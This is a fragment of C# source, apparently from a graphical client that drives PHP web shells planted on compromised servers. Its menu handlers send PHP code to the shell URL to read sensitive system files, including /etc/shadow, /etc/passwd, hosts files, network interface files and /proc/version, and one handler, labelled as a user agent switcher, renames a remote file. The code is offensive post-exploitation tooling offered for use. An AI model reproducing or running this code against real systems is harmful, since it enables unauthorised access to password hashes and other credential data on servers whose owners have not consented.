            executePHPCodeDisplayInRichTextBox(phpCode, "ifconfig");
        }

        #endregion

        #region READ_COMMON_FILES
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsTargetsMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.windowsFS_hostTargets);
            executePHPCodeDisplayInRichTextBox(phpCode, "hosts");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_NetworkInterfaces);
            executePHPCodeDisplayInRichTextBox(phpCode, "interfaces");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linusVersionMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_ProcVersion);
            executePHPCodeDisplayInRichTextBox(phpCode, "version");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxhostsMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_hostTargetsFile);
            executePHPCodeDisplayInRichTextBox(phpCode, "hosts");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_IssueFile);
            executePHPCodeDisplayInRichTextBox(phpCode, "issue.net");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void shadowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_ShadowFile);
            executePHPCodeDisplayInRichTextBox(phpCode, "shadow");
        }

        private async void userAgentSwitcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string fileName = "User Agent:";
            string newFileName = CustomForms.RenameFileDialog(fileName, "Change User Agent");

            if (newFileName != "")
            {
                string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";

                string result = await WebHelper.WebRequest(g_SelectedShellUrl, phpCode);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_PasswdFile);
            executePHPCodeDisplayInRichTextBox(phpCode, "passwd");
        }

        #endregion

    }
}
